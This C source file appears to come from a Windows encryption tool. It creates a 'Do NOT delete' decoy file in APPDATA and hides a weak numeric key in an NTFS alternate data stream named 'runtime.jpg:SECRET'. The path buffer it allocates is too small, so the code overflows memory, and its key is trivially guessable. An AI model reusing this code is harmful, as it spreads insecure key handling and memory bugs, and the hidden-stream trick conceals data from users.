#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>

#include ".\include\key.h"
#include ".\include\log.h"

/*  key can't have 0s in it, 
  so it can be converted into an array (see encrypt.c) */

unsigned int reverseNumber(int temp)
{
    int ans = 0;
    while (temp > 0) {
        int rem = temp % 10;
        ans = ans * 10 + rem;
        temp = temp / 10;
    }
    return (unsigned int) ans;
}


int convert0To5(unsigned int num)
{
    if (num == 0)
        return 5;
    else {
        int temp = 0;
        while (num > 0) {
            int digit = num % 10;
            if (digit == 0)
                digit = 5;
            temp = temp * 10 + digit;
            num = num / 10;
        }
        return reverseNumber(temp);
    }
}
 

unsigned int _writeAndReturnKey(int randUpperBound)
{

  char originalFileName[] = "runtime.txt"; 
  /* emojis turn into random symbols */
  char originalFileContents[] = "---Do NOT delete this file--- \n ‼️🤤😱⁉️🙏🥰🥰😨💓💀😳⚠️⚠️😋😋😳😳💀💓💀💀💓";

  writeToAppData(originalFileName, originalFileContents);

  /* writeToAppData() doesn't work with alternative data streams,
  here's a very hardcoded implementation of it that works for
  this application's context */

  unsigned int _randomInteger = randomValue(randUpperBound);

  unsigned int randomInteger = convert0To5(_randomInteger);

  char alternativeDataStreamFileName[] = "runtime.jpg:SECRET";

  /* no point in checking if appdata exists from this point,
  writeToAppData would of already taken care of that */

  char * appDataPath = getenv("APPDATA");
  char * subFolderPath = "\\EncryptionTool";

  char * alternativeDataStreamPath = malloc(strlen(appDataPath) +
                                  strlen(subFolderPath) +
                  strlen(alternativeDataStreamFileName));

  sprintf(alternativeDataStreamPath, "%s%s\\%s", appDataPath,
              subFolderPath, alternativeDataStreamFileName);

  FILE* stream_pointer = fopen(alternativeDataStreamPath, "w");

  fprintf(stream_pointer, "%u", randomInteger);

  Sleep(1000);

  printf("[Key] Wrote key");

  fclose(stream_pointer);

  return randomInteger;
}

unsigned int writeAndReturnKey(int randUpperBound) {

    unsigned int a = _writeAndReturnKey(randUpperBound);

    if (a == 0) {
        a = _writeAndReturnKey(randUpperBound);
        printf("\n");
    }

    if (a == 0) {
        a = _writeAndReturnKey(randUpperBound);
        printf("\n");
    }
     
    if (a == 0) {
        a = _writeAndReturnKey(randUpperBound);
        printf("\n");
    } 
     
    if (a == 0) {
        for (;;)
            Sleep(50);
    };

    return a;   

    
}